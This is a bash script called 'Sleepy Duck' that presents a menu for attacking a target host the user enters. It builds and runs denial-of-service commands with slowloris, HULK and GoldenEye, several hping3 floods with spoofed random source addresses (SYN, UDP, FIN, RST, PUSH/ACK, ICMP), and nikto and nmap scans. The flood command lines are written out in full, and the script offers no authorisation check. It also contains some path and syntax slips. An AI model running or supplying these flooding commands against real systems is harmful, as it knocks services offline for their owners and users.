#!/bin/bash
# Welcome to the Sleepy Duck
# Author: Aleksandr Krasnov
# Contact: https://www.linkedin.com/in/alekkras

# Define colors for pretty output

red=$'\e[1;31m'
grn=$'\e[1;32m'
yel=$'\e[1;33m'
blu=$'\e[1;34m'
mag=$'\e[1;35m'
cyn=$'\e[1;36m'
end=$'\e[0m'

# Ask the user for the target
# The webserver would be the target
intro()
{
echo "What is your ${red}target${end}?"
echo ""
echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read target
echo "$target" > target.txt #use  >> if you would like to append instead of overwriting
}
#intro


# If you would like to perform vulnerability assessment, that is the first thing you should do
# For first-timers, perform everything is an option suggested
nmap()
{
    pwd
    cat art/nmap.txt
    echo "Would you like to run a basic vulnerability assessment [nmap]?(y/n)"
    echo -n "{grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read response
    if [[ $response == "Y" || $response == "y" ]]; then
        echo "${grn}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  ${end}"
        echo "${grn}                Great! Here are some options for you!                ${end}"
        echo "${grn}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  ${end}"
        echo "1) Automatically perform everything (it should take about 30 mins)"
        echo "2) HTTP headers"
        echo "3) Any possible exploits"
        echo "Which one would you like to perform?"
        echo -n "{grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read ch
        if [[ $ch == "1" ]]; then
          cd scripts
          bash 1.sh.sh
        elif [[ $ch == "2" ]]; then
          cd scripts
          bash 2.sh
        elif [[ $ch == "3" ]]; then
          cd scripts
          bash 3.sh
        else
          echo "We will not run any of scripts as you said"
        fi

    else
        echo "We will not run any of scripts as you said"
    fi
}
#nmap


#dos - slowloris
slowloris()
{
    cat art/slowloris.txt
    echo "Would you like to perform DoS?(y/n)"
    echo ""
    echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read dos
    if [[ $dos == "Y" || $dos == "y" ]]; then
        cd tools/slowloris.pl
        touch attack.txt
        echo -n "perl slowloris.pl -dns " > attack.txt
        cd ../..
        echo -n "$target" >> tools/slowloris.pl/attack.txt
        cd tools/slowloris.pl/
        bash attack.txt
    else
        echo "We will not run any of scripts as you said"
    fi
}
#slowloris



#nikto - overall basic scan [vulnerability assessment]
nikto()
{
    cat art/nikto.txt
    echo "Would you like to perform a vulnerability assessment?(y/n)?"
    echo ""
    echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read nikto
    if [[ $nikto == "Y" || $nikto == "y" ]]; then
        cd tools/nikto
        touch attack_nikto.txt
        echo -n "nikto -Display 1234EP -o report_nikto.html -Format htm -Tuning 58 -host " > attack_nikto.txt
        cd ../..
        echo -n "$target" >> tools/nikto/attack_nikto.txt
        cd tools/nikto
        bash attack_nikto.txt
        # move report_nikto.html to /results
        pwd
        mv report_nikto.html ../..
        cd ../..
        mv report_nikto.html results/
    else
        echo "We will not run any of scripts as you said"
    fi
}
#nikto



#hulk
hulk()
{
    cat art/hulk.txt
    echo "Would you like to perform DoS? [HULK] (y/n)?"
    echo ""
    echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read hulk
    if [[ $hulk == "Y" || $hulk == "y" ]]; then
        cd tools/hulk
        touch attack_hulk.txt
        echo -n "python hulk.py -site " > attack_hulk.txt
        cd ..&& cd ..
        echo -n "$target" >> tools/nikto/attack_hulk.txt
        cd tools/hulk
        bash attack_hulk.txt
    else
        echo "We will not run any of scripts as you said"
    fi
}
#hulk



#hping
hping()
{

    cat art/hping3.txt
    echo "Would you like to perform Flood? [hping3] (y/n)?"
    echo ""
    echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read hping
    if [[ $hping == "Y" || $hping == "y" ]]; then
        mkdir results/
        cd results
        mkdir hping
        cd ..
        echo "- - - - - - - - - - - - - - - - - - - - - - -"
        echo "Here are possible options on what to do?"
        echo " "
        echo "1) Check whether a host is alive (when PING is blocked) - send RST"
        echo "2) Perform DoS attack"
        echo "3) Perform UDP flood"
        echo "4) Perform TCP FIN flood"
        echo "5) Perform TCP RST flood"
        echo "6) Perform PUSH and ACK floods"
        echo "7) Perform ICMP and IGMP floods"
        echo "8) Exit"
        echo "- - - - - - - - - - - - - - - - - - - - - - -"
        echo "Which one would you like to do?"
        echo -n "${red}(づ｡◕‿‿◕｡)づ     ${end}" ; read choice
        if [[ $choice == "1" ]]; then
          cd results/hping/
          touch host_alive.txt
          echo -n "hping3 -c 1 -V -p 80 -s 5050 -F " > host_alive.txt
          cd ../..
          echo -n "$target" >> results/hping/host_alive.txt
          cd results/hping/
          bash host_alive.txt
          cd ../..
          hping
        elif [[ $choice == "2" ]]; then
          cd results/hping/
          touch hping_dos.txt
          echo -n "hping3 -c 20000 -d 120 -S -w 64 -p 80 --flood --rand-source " > hping_dos.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_dos.txt
          cd results/hping/
          bash hping_dos.txt
          cd ../..
          hping

        elif [[ $choice == "3" ]]; then
          cd results/hping/
          touch hping_udp.txt
          echo -n "hping3 --flood --rand-source --udp -p 80 " > hping_udp.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_udp.txt
          cd results/hping/
          bash hping_udp.txt
          cd ../..
          hping

        elif [[ $choice == "4" ]]; then
          cd results/hping/
          touch hping_tcp_fin.txt
          echo -n "hping3 --flood --rand-source -F -p 80 " > hping_tcp_fin.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_tcp_fin.txt
          cd results/hping/
          bash hping_tcp_fin.txt
          cd ../..
          hping

        elif [[ $choice == "5" ]]; then
          cd results/hping/
          touch hping_tcp_rst.txt
          echo -n "hping3 --flood --rand-source -R -p 80 " > hping_tcp_rst.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_tcp_rst.txt
          cd results/hping/
          bash hping_tcp_rst.txt
          cd ../..
        elif [[ $choice == "6" ]]; then
          cd results/hping/
          touch hping_puch_ack.txt
          echo -n "hping3 --flood --rand-source -PA -p 80 " > hping_puch_ack.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_puch_ack.txt
          cd results/hping/
          bash hping_puch_ack.txt
          cd ../..
        elif [[ $choice == "7" ]]; then
          cd results/hping/
          touch hping_icmp_igmp.txt
          echo -n "hping3 --flood --rand-source -1 -p 80 " > hping_icmp_igmp.txt #we will do port 80, in specific cases you can manually change it to port 443
          cd ../..
          echo -n "$target" >> results/hping/hping_icmp_igmp.txt
          cd results/hping/
          bash hping_icmp_igmp.txt
          cd ../..
        else
          echo "Would you like to do it over again? (y/n)"
          echo -n "${red}(ಠ_ಠ)    ${end}" ; read repeat
          if [[ $repeat == "Y" || $repeat == "y" ]]; then
            hping
          else
            exit
          fi
        fi
    else
        echo "We will not run any of scripts as you said"

fi
}
#hping


#GoldenEye
golden_eye()
{
  pwd
  cat art/goldeneye.txt
  echo "Would you like to perform DoS? [GoldenEye] (y/n)?"
  echo ""
  echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read eye
  if [[ $eye == "Y" || $eye == "y" ]]; then

    cd tools/GoldenEye/
    touch attack_dos.txt
    echo -n "python goldeneye.py https://" > attack_dos.txt
    cd ../..
    echo -n "$target" >> tools/GoldenEye/attack_dos.txt
    cd tools/GoldenEye
    bash attack_dos.txt
    cd ../..
    
  else
    echo "We will not run any of scripts as you said"
fi
}
#golden_eye

main()
{
  cat art/duck.txt
  echo "Welcome to the Sleepy-Duck"
  echo "Let's find the target!!!"
  intro
  echo "What would you like to perform?"
  echo "1) ${red}DoS${end} attack"
  echo "2) Vulnerability assessment"
  echo "What would ${cyn}you${end} like to do"
  echo ""
  echo -n "${grn}༼(∩ ͡°╭͜ʖ╮͡ ͡°)༽⊃${end}━${yel}☆ﾟ. * ･ ｡ﾟ   ${end}" ; read option
  if [[ $option == "1" ]]; then
    slowloris
    hulk
    hping
    golden_eye
    cat art/bye.txt
  elif [[ $option == "2" ]]; then
    nikto
    nmap
    cat art/bye.txt
  else
    cat art/bye.txt
fi
}
main